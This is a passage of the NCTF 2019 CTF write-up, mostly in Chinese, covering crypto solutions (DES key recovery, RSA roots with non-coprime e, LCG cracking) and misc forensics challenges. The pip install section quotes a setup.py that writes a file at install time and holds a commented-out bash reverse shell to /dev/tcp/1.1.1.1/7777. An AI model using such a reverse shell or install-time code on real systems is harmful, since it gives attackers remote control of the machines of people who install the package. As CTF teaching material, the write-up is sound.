not_in_PC2 = [9,18,22,25,35,38,43,54]

def re_PC2(sbkey):
    # 48-bit -> 56-bit
    res = [0]*56
    for i in range(len(sbkey)):
        res[PC_2_table[i]-1] = sbkey[i]
    return res # ok

def guess_CiDi10(sbkey, t):
    res = re_PC2(sbkey)
    for i in range(8):
        res[not_in_PC2[i]-1] = guess_8bit[t][i]
    return res # ok

def guess_allsbkey(roundkey, r, t):
    sbkey = [[]]*16
    sbkey[r] = roundkey
    CiDi = guess_CiDi10(roundkey, t)
    Ci, Di = CiDi[:28], CiDi[28:]
    for i in range(r+1,r+16):
        Ci, Di = LR(Ci, Di, i%16)
        sbkey[i%16] = PC_2(Ci+Di)
    return sbkey # ok

def long_des_enc(c, k):
    assert len(c) % 8 == 0
    res = b''
    for i in range(0,len(c),8):
        res += DES_enc(c[i:i+8], k)
    return res

def try_des(cipher, roundkey):
    for t in range(256):
        allkey = guess_allsbkey(roundkey, 10, t)
        plain = long_des_enc(cipher, allkey[::-1])
        if plain.startswith(b'NCTF'):
            print(plain)

if __name__ == "__main__":
    cipher = b64decode(b'm0pT2YYUIaL0pjdaX2wsxwedViYAaBkZA0Rh3bUmNYVclBlvWoB8VYC6oSUjfbDN')
    sbkey10 = [0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1]
    try_des(cipher, sbkey10)
# b'NCTF{1t_7urn3d_0u7_7h47_u_2_g00d_@_r3v3rs3_1snt}'
```

### easyRSA[909pt 2solvers]
**Description**
```
==Difficulty: simple==

We can do RSA decryption even if e and phi(n) are not coprime.

Hint: m has exactly 24196561 solutions :)

Hint2: https://stackoverflow.com/questions/6752374/cube-root-modulo-p-how-do-i-do-this

Hint3: https://arxiv.org/pdf/1111.4877.pdf

==Author: Soreat_u==
```

**Introduction**

此题灵感来自于`hackergame 2019`的一道`十次方根`题。那一题当时从下午2、3点一直做到了晚上12点，终于在将近10个小时的搜寻、推算之后，解了出来，印象十分深刻，也学到很多很多东西。

那道题主要要解决的一个问题就是，如何在有限域内开10次方根。

当时几乎翻了上十篇paper，才在 https://arxiv.org/pdf/1111.4877.pdf 这篇paper里找到了一个比较容易实现的算法。

做完后，思考了下，发现能够扩展到RSA上面。

我们知道，RSA对参数的一个要求就是，e和phi(n)一定要互素。这是为了要让e在模phi(n)下存在逆元d，进而可以直接`pow(c, d, n)`来解密。

那如果e和phi(n)不互质就会无解么？不，事实上，**有解而且不止有一解**。

这一题就是基于这个观察而出的。

**Analysis**

![image-20191118155729801](http://www.soreatu.com/ctf/writeups/img/image-20191118155729801.png)

题面十分简洁，甚至都给出了`p, q`。乍一看，肯定觉得这是一道**送分题**，然而事实远非如此。

---

正常情况下的RSA都要求`e`和`phi(n)`要互素，不过也有一些`e`和`phi(n)`有很小的公约数的题目，这些题目基本都能通过计算`e`对`phi(n)`的逆元`d`来求解。

然而本题则为`e`和`p-1`(或`q-1`)的最大公约数就是`e`本身，也就是说`e | p-1`，只有对`c`开`e`次方根才行。
可以将同余方程
$$
m^e \equiv c \quad (\text{mod}\ n)
$$
化成
$$
\begin{aligned}
m^e &amp;\equiv c \quad (\text{mod}\ p)\\
m^e &amp;\equiv c \quad (\text{mod}\ q)
\end{aligned}
$$
然后分别在`GF(p)`和`GF(q)`上对`c`开`e=0x1337`次方根，再用`CRT`组合一下即可得到在`mod n`下的解。

---

问题是，**如何在有限域内开根**？

这里`e`与`p-1`和`q-1`都不互素，不能简单地求个逆元就完事。

这种情况下，**开平方根**可以用`Tonelli–Shanks algorithm`，[wiki](https://en.wikipedia.org/wiki/Tonelli%E2%80%93Shanks_algorithm)说这个算法可以**扩展到开n次方根**。

在这篇[paper](https://arxiv.org/pdf/1111.4877.pdf)里给出了具体的算法：`Adleman-Manders-Miller rth Root Extraction Method`

> 应该还有其他的算法。。不过这一个对我来说比较容易去implement。

![Adleman-Manders-Miller cubic root extraction method](http://www.soreatu.com/ctf/writeups/img/upload_9b5a09314ebc2fc12664f46dcc1454d7.png)

这个算法只能开出一个根，实际上开0x1337次方，最多会有0x1337个根（这题的情况下有0x1337个根）。

如何找到其他根？
[StackOverflow - Cube root modulo P](https://stackoverflow.com/questions/6752374/cube-root-modulo-p-how-do-i-do-this)给出了方法：

![How to find other roots](http://www.soreatu.com/ctf/writeups/img/upload_9fec8355a72a11ad785476d00bc8365a.png)

如何找到所有的`primitve 0x1337th root of 1`?
[StackExchange - Finding the n-th root of unity in a finite field](https://crypto.stackexchange.com/questions/63614/finding-the-n-th-root-of-unity-in-a-finite-field)给出了方法：

![How to find primitive nth root of 1](http://www.soreatu.com/ctf/writeups/img/upload_0e8cd49caa4c715d36e93b7d5176dabf.png)

**Exploit**

- 先用`Adleman-Manders-Miller rth Root Extraction Method`在`GF(p)`和`GF(q)`上对`c`开`e`次根，分别得到一个解。大概不到10秒。
- 然后去找到所有的`0x1336`个`primitive nth root of 1`，乘以上面那个解，得到所有的`0x1337`个解。大概1分钟。
- 再用`CRT`对`GF(p)`和`GF(q)`上的两组`0x1337`个解组合成`mod n`下的解，可以得到`0x1337**2==24196561`个`mod n`的解。最后能通过`check`的即为`flag`。大概十几分钟。

`exp.sage`如下：
```python
import random
import time

# About 3 seconds to run
def AMM(o, r, q):
    start = time.time()
    print('\n----------------------------------------------------------------------------------')
    print('Start to run Adleman-Manders-Miller Root Extraction Method')
    print('Try to find one {:#x}th root of {} modulo {}'.format(r, o, q))
    g = GF(q)
    o = g(o)
    p = g(random.randint(1, q))
    while p ^ ((q-1) // r) == 1:
        p = g(random.randint(1, q))
    print('[+] Find p:{}'.format(p))
    t = 0
    s = q - 1
    while s % r == 0:
        t += 1
        s = s // r
    print('[+] Find s:{}, t:{}'.format(s, t))
    k = 1
    while (k * s + 1) % r != 0:
        k += 1
    alp = (k * s + 1) // r
    print('[+] Find alp:{}'.format(alp))
    a = p ^ (r**(t-1) * s)
    b = o ^ (r*alp - 1)
    c = p ^ s
    h = 1
    for i in range(1, t):
        d = b ^ (r^(t-1-i))
        if d == 1:
            j = 0
        else:
            print('[+] Calculating DLP...')
            j = - dicreat_log(a, d)
            print('[+] Finish DLP...')
        b = b * (c^r)^j
        h = h * c^j
        c = c ^ r
    result = o^alp * h
    end = time.time()
    print("Finished in {} seconds.".format(end - start))
    print('Find one solution: {}'.format(result))
    return result

def findAllPRoot(p, e):
    print("Start to find all the Primitive {:#x}th root of 1 modulo {}.".format(e, p))
    start = time.time()
    proot = set()
    while len(proot) < e:
        proot.add(pow(random.randint(2, p-1), (p-1)//e, p))
    end = time.time()
    print("Finished in {} seconds.".format(end - start))
    return proot

def findAllSolutions(mp, proot, cp, p):
    print("Start to find all the {:#x}th root of {} modulo {}.".format(e, cp, p))
    start = time.time()
    all_mp = set()
    for root in proot:
        mp2 = mp * root % p
        assert(pow(mp2, e, p) == cp)
        all_mp.add(mp2)
    end = time.time()
    print("Finished in {} seconds.".format(end - start))
    return all_mp


c = 10562302690541901187975815594605242014385201583329309191736952454310803387032252007244962585846519762051885640856082157060593829013572592812958261432327975138581784360302599265408134332094134880789013207382277849503344042487389850373487656200657856862096900860792273206447552132458430989534820256156021128891296387414689693952047302604774923411425863612316726417214819110981605912408620996068520823370069362751149060142640529571400977787330956486849449005402750224992048562898004309319577192693315658275912449198365737965570035264841782399978307388920681068646219895287752359564029778568376881425070363592696751183359
p = 199138677823743837339927520157607820029746574557746549094921488292877226509198315016018919385259781238148402833316033634968163276198999279327827901879426429664674358844084491830543271625147280950273934405879341438429171453002453838897458102128836690385604150324972907981960626767679153125735677417397078196059
q = 112213695905472142415221444515326532320352429478341683352811183503269676555434601229013679319423878238944956830244386653674413411658696751173844443394608246716053086226910581400528167848306119179879115809778793093611381764939789057524575349501163689452810148280625226541609383166347879832134495444706697124741
e = 0x1337
cp = c % p
cq = c % q
mp = AMM(cp, e, p)
mq = AMM(cq, e, q)
p_proot = findAllPRoot(p, e)
q_proot = findAllPRoot(q, e)
mps = findAllSolutions(mp, p_proot, cp, p)
mqs = findAllSolutions(mq, q_proot, cq, q)
print mps, mqs

def check(m):
    h = m.hex()
    if len(h) & 1:
        return False
    if h.decode('hex').startswith('NCTF'):
        print(h.decode('hex'))
        return True
    else:
        return False


# About 16 mins to run 0x1337^2 == 24196561 times CRT
start = time.time()
print('Start CRT...')
for mpp in mps:
    for mqq in mqs:
        solution = CRT_list([int(mpp), int(mqq)], [p, q])
        if check(solution):
            print(solution)
    print(time.time() - start)
            
end = time.time()
print("Finished in {} seconds.".format(end - start))
```

![image-20191118155950549](http://www.soreatu.com/ctf/writeups/img/image-20191118155950549.png)

**Summary**

`p, q`都是预先用下面这个函数生成的，保证了`e | p-1, e | q-1`。

```python
import random
from Crypto.Util.number import *

def gen():
    p = e * random.getrandbits(1012) + 1
    while not isPrime(p):
        p = e * random.getrandbits(1012) + 1
    return p
```

而且`p-1, q-1`的`ord(e) = 1`，使得`Adleman-Manders-Miller rth Root Extraction Method`中无需计算`DLP`。降低了题目难度。

`flag`后面填充了一段杂乱的字符串，是为了增加`flag`转成整数后的位数。不然位数太低，算出`GF(p)`和`GF(q)`里2组`0x1337`个解，取交集就可以得到`flag`了。位数增加后，就必须要算`24196561`次`CRT`才能得到`flag`，可能需要个十几分钟来跑。


### LCG[667pt 6solvers]
**Description**
```
==Difficulty: interesting==

不知道大家信安数基学的怎么样

nc 139.129.76.65 60001

The script to pass proof of work is provided in the link.

Have fun :>

==Author: Soreat_u==
```

**Introduction**

最近在看随机数，里面有一个方法就是LCG(线性同余生成器)。
$$
N_{i+1} \equiv a\cdot N_{i} + b \quad \text{mod}\ \ m
$$

在 https://zeroyu.xyz/2018/11/02/Cracking-LCG/ 里，作者详细地描述了4种针对各种参数已知情况的攻击。本题就是基于这篇文章而出的。

**Analysis**

具体分析可以参考: https://zeroyu.xyz/2018/11/02/Cracking-LCG/。

**Exploit**

直接贴`exp.py`:

```python
# python2
import hashlib
import primefac
from pwn import *
from Crypto.Util.number import *

host, port = '', 10000
r = remote(host, port)

# context.log_level = 'debug'

def proof_of_work():
    print '[+] Proof of work...'
    r.recvuntil('hexdigest() = ')
    digest = r.recvline().strip()
    r.recvuntil("s[:7].encode('hex') =")
    prefix = r.recvline().strip().decode('hex')
    # s = r.recvline().strip()
    for suffix in range(256**3):
        guess = prefix + long_to_bytes(suffix, 3)
        if hashlib.sha256(guess).hexdigest() == digest:
            print '[+] find: ' + guess.encode('hex')
            break
    r.recvuntil("s.encode('hex') = ")
    # r.sendline(s)
    r.sendline(guess.encode('hex'))

def solve1(N, a, b, n1):
    return (n1 - b) * inverse(a, N) % N

def solve2(N, a, n1, n2):
    b = (n2 - n1 * a) % N
    return solve1(N, a, b, n1)

def solve3(N, n1, n2, n3):
    a = (n3 - n2) * inverse(n2 - n1, N) % N
    return solve2(N, a, n1, n2)

def solve4(n1, n2, n3, n4, n5, n6):
    t1 = n2 - n1
    t2 = n3 - n2
    t3 = n4 - n3
    t4 = n5 - n4
    t5 = n6 - n5
    N = GCD(t3*t1 - t2**2, t5*t2 - t4*t3)
    factors = primefac.factorint(N)
    while not isPrime(N):
        for prime, order in factors.items():
            if prime.bit_length() > 128:
                continue
            N = N / prime**order
    return solve3(N, n1, n2, n3)

def challenge1():
    print '[+] Solving challenge1...'
    r.recvuntil('lcg.N = ')
    N = int(r.recvline().strip())
    r.recvuntil('lcg.a = ')
    a = int(r.recvline().strip())
    r.recvuntil('lcg.b = ')
    b = int(r.recvline().strip())
    r.recvuntil('lcg.next() = ')
    next1 = int(r.recvline().strip())

    init_seed = solve1(N, a, b, next1)
    r.recvuntil('lcg.seed = ')
    r.sendline(str(init_seed))

def challenge2():
    print '[+] Solving challenge2...'
    r.recvuntil('lcg.N = ')
    N = int(r.recvline().strip())
    r.recvuntil('lcg.a = ')
    a = int(r.recvline().strip())
    r.recvuntil('lcg.next() = ')
    next1 = int(r.recvline().strip())
    r.recvuntil('lcg.next() = ')
    next2 = int(r.recvline().strip())

    init_seed = solve2(N, a, next1, next2)
    r.recvuntil('lcg.seed = ')
    r.sendline(str(init_seed))

def challenge3():
    print '[+] Solving challenge3...'
    r.recvuntil('lcg.N = ')
    N = int(r.recvline().strip())
    r.recvuntil('lcg.next() = ')
    next1 = int(r.recvline().strip())
    r.recvuntil('lcg.next() = ')
    next2 = int(r.recvline().strip())
    r.recvuntil('lcg.next() = ')
    next3 = int(r.recvline().strip())

    init_seed = solve3(N, next1, next2, next3)
    r.recvuntil('lcg.seed = ')
    r.sendline(str(init_seed))

def challenge4():
    print '[+] Solving challenge4...'
    r.recvuntil('lcg.next() = ')
    next1 = int(r.recvline().strip())
    r.recvuntil('lcg.next() = ')
    next2 = int(r.recvline().strip())
    r.recvuntil('lcg.next() = ')
    next3 = int(r.recvline().strip())
    r.recvuntil('lcg.next() = ')
    next4 = int(r.recvline().strip())
    r.recvuntil('lcg.next() = ')
    next5 = int(r.recvline().strip())
    r.recvuntil('lcg.next() = ')
    next6 = int(r.recvline().strip())

    init_seed = solve4(next1, next2, next3, next4, next5, next6)
    r.recvuntil('lcg.seed = ')
    r.sendline(str(init_seed))


proof_of_work()

challenge1()
challenge2()
challenge3()
challenge4()

r.interactive()
```

![image-20191118161702983](https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/t0167b0316bf8fd29d0.png)

**Summary**

这些东西，信安数基书上都写得明明白白的，可不要白学了。



## MISC
### a_good_idea[48pt 200solvers]
```
==Difficulty: easy==

汤姆有个好主意

==Author zihu4n==
```

出的容差分析，不过因为只是在不同的地方给red+1，所以不用容差也能做出来，在sub那边就能看到。

### pip install[53pt 179solvers]
```
==Difficulty: easy==

run pip install --user nctf-2019-installme to get flag!

==Author rmb122==
```

目的就是想展示下安装三方python package的时候能执行任意代码，在 https://pypi.org/project/nctf-2019-installme/ 可以看到安装包。
打开看到 `setup.py`

```python=
tmp_file = tempfile.gettempdir() + path.sep + '.f14g_is_here'
f = open(tmp_file, 'w')
f.write('TkNURntjNHJlZnVsX2FiMHU3X2V2MWxfcGlwX3A0Y2thZ2V9')
f.close()

# system('bash -i >& /dev/tcp/1.1.1.1/7777 0>&1')
# Ohhhh, that a joke. I won't do that. 
```

可以看到往临时目录下写了个文件，base64decode一下就是flag。

### 有内鬼,终止交易[769pt 4solvers]
```
==Difficulty: medium==

你就是那个内鬼

Hint: config.json

Hint2: Using NCTF{.*} to search flag after you decrypt the traffic

==Author rmb122==
```

shadowsocks的加密很简单，前16字节iv，后面是密文，因为用的cfb模式，是流加密，所以你也可以看到代码里面写的直接socket.recv(mtu)，并没有检测收到的数据是16的倍数。
然后写个脚本解密就行了, 手动解密的同学我佩服你的毅力 tql  

```python
import pyshark
from binascii import unhexlify
from shadowsocks.crypto.openssl import OpenSSLStreamCrypto
from shadowsocks.cryptor import EVP_BytesToKey

streams = set()
decrypted_stream = set()

password, _ = EVP_BytesToKey(b'5e77b05530b30283e24c120d8cc13fb5', 32, 16)
server = '25565'
send = b''
recv = b''

def stream_callback(pkt):
    if hasattr(pkt, 'data'):
        streams.add(pkt.tcp.stream)

def decrypt_callback(pkt):
    global send
    global recv

    if hasattr(pkt, 'data'):
        if pkt.tcp.dstport == server:
            send += unhexlify(pkt.data.data)
        else:
            recv += unhexlify(pkt.data.data)

shark = pyshark.FileCapture('chall.pcapng', display_filter="tcp.port == 25565 and ip.addr == 123.207.121.32")
shark.apply_on_packets(stream_callback)

print(streams)

for i in streams:
    send = b''
    recv = b''
    
    shark = pyshark.FileCapture('chall.pcapng', display_filter=f"tcp.stream eq {i}")
    shark.apply_on_packets(decrypt_callback)

    decryptor = OpenSSLStreamCrypto('aes-256-cfb', password, recv[:16], 0)
    data = decryptor.decrypt(recv[16:])
    if b'NCTF' in data:
        print(data)
```

### What's this[145pt 60solvers]
```
==Difficulty: intuitive==

know it then find it

==Author 1chig0==
```

导出对象

![](https://ps.ssl.qhmsg.com/t011fb371dcff0c8990.png)

对较大文件进行foremost

![](https://ps.ssl.qhmsg.com/t01657663833015848b.png)

出现了压缩包，需要密码

![](https://ps.ssl.qhmsg.com/t0133c8ecb3e74b1aec.png)

看下十六进制，有伪加密，修改回00

![](https://ps.ssl.qhmsg.com/t01356abe52d0ddd26a.png)

可以打开文件，看到文件

![](https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/t0137dfbe4046d788ff.png)

很明显是base64隐写。跑下脚本即可

```python
# -*- coding: utf8 -*-
b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
#https://tr0y.wang/2017/06/14/Base64steg/
with open('What1s7his.txt', 'rb') as f:
    bin_str = ''
    for line in f.readlines():
        stegb64 = ''.join(line.split())
        rowb64 = ''.join(stegb64.decode('base64').encode('base64').split())

        offset = abs(b64chars.index(stegb64.replace('=', '')[-1]) - b64chars.index(rowb64.replace('=', '')[-1]))
        equalnum = stegb64.count('=')  # no equalnum no offset

        if equalnum:
            bin_str += bin(offset)[2:].zfill(equalnum * 2)

        print ''.join([chr(int(bin_str[i:i + 8], 2)) for i in xrange(0, len(bin_str), 8)])  # 8位一组
```

![](https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/t01108494707c5563f3.png)


### Become a Rockstar[182pt 46solvers]
```
==Difficulty: easy==

MoZhu is an excellent guitarist. When he plays the guitar, he sings something. aiQG wants to know what MoZhu sang and he records the lyrics. But aiQG can not read the lyrics. Could you help him?

==Author aiQG==
```

github上搜[Rockstar](https://github.com/yyyyyyyyyyan/rockstar-py)
配个py的解释器能跑出来

### 小狗的秘密[278pt 27solvers]
```
==Difficulty: easy==

can u find it?

==Author L3mory==
```

* 下载下来是一个流量包，过滤一下http，仔细观察发现会有一个不一样的请求，一堆（255，255，255），像素点，用python合成一张图片即可得到flag。
* python脚本如下

``` python
from PIL import Image

x = 500
y = 100
im = Image.new("RGB",(x,y))
file = open("../data.txt","r")
for i in range(x):
	for j in range(y):
		line = file.readline()
		rgb = line.split(",")
		im.putpixel((i,j),(int(rgb[0].strip("(")),int(rgb[1]),int(rgb[2].strip("\n").strip(")"))))
im.show()
im.save("./flag.jpg")
```

### Bright Body I[250pt 31solvers]
```
==Difficulty: medium==

aiQG was a noob of Dark Souls III. Now, he has given up playing this game and designed a simpler one. Have fun!

文件链接:百度云: https://pan.baidu.com/s/1EFGfcqj7VFNfVhblzkjmJA 密码:q8ma

Google Drive: https://drive.google.com/file/d/1f8BjdSi2iD2nTqYSHtZ8KRxSW6faSPgv/view

==Author aiQG==
```

//这题是一个模版改的
//少加了门, 导致被老玩家日穿了
//好像加载存档的逻辑也有问题。。。


### 2077[294pt 25solvers]
**Description**
```
==Difficulty: Chanllenging==

Wanna play cyberpunk 2077?

Maybe you should first check this video in the link.

Flag is NCTF{sha256(the picture you solve from the stream code)}, e.g., NCTF{f1829e6b51efb1b939731a6acfe0aea313ddee489d53fbc5b0b5c8d1813ce64c}.

==Author: Soreat_u==
```

Link: https://www.twitch.tv/videos/302423092

**Introduction**

18年的暑假，是高考后的暑假。

深夜难眠，在youtube上刷到了这个`Cyberpunk 2077`，被这个游戏的世界观所吸引，自此`Cyberpunk 2077 txdy`。

**Analysis**

打开题目链接： https://www.twitch.tv/videos/302423092 

![image-20191128184932821](https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/t01db82d890063f5394.png)

神秘代码大概在`00:04:30`左右开始。

不难发现这是一串由`Base64`编码的代码。

再由这串代码的头部`iVBORw0K`是`\x89PNG\x0d\x0a`不难发现这实际上是一个`Base64`编码的**图片**。

视频长达`09:50:29`，神秘代码大概在`08:35:14`左右结束。

后面从`09:00:23`开始到结束都是`Cyberpunk 2077`的第一次实机演示视频。（其实我出这道题的目的就是想给大家安利一下这款游戏。。。

**Exploit**

长达8个多小时神秘代码，用手一个一个记录下来，再解码肯定是不现实的。写图片文字识别，能将这段视频里的文字都识别出来的，那是真的nb。（ https://github.com/sigalor/cyberpunk-data-transmission 还真有！不过这个里面解出来的png文件尾部少了十几个字节，png文件不完整

本题的实际目的，是想考察一下大家的**社工能力**。

实际上，只要会用`Google`，根据题目特征搜索一下，即可从网上找到这张解码后的图片。

![image-20191128190825223](https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/t01b48d2551ccd970a5.png)

![image-20191128190856325](https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/t01826e93be28d58424.png)

图片地址： https://i.imgur.com/MndfnPz.png

download下来，然后sha256即可获得flag。

NCTF{90b0443265e51869ff6c645b3104dd9df085db89266bf2290c9d24c76d458590}

### 键盘侠[303pt 24solvers]
```
==Difficulty: easy==

are u Keyboard man?

==Author zjy==
```

* 解压一个伪加密的压缩包，从解压得到的图片中分离出一个压缩包，将后缀改为doc，查看隐藏文字，发现一串编码，base85解码后即可得到flag

### NCTF2019调查问卷[91pt 101solvers]
```
==Difficulty: easy==

你需要科学上网鸭。

==Author yulige==
```

![](https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/t01f857f9f86c147f09.png)

![](https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/t01b1e93b229407a739.png)

![](https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/t01f2032133a6a7074a.png)

![](https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/t01be5dbf8733462d48.png)

![](https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/t01eee4fc39c0d819a2.png)

![](https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/t01fe88ee6e1a5c9572.png)

![](https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/t01ba22050eeee4a22a.png)

![](https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/t01535722c2bc69f2fe.png)

![](https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/t01ce54c1cb4788adf1.png)

![](https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/t01255876b327418c6f.png)

![](https://ps.ssl.qhmsg.com/t0181754a17e28bd587.png)

![](https://ps.ssl.qhmsg.com/t0140e936e2b087d81b.png)

![](https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/t015cace3cfb100ec96.png)

![](https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/t01ead6cc576f578fc4.png)

![](https://ps.ssl.qhmsg.com/t0180cc06d964147ee6.png)

![](https://ps.ssl.qhmsg.com/t018412c9ab74ba4569.png)

![](https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/t011946aecae544f7a2.png)

![](https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/t019e0d0c3253c460c1.png)

![](https://soreatu-1300077947.cos.ap-nanjing.myqcloud.com/uPic/t012c2ee23960c5b1e6.png)



## Summary
最后，十分感谢大家来参加我们的NCTF 2019！

欢迎大家明年再来玩鸭！

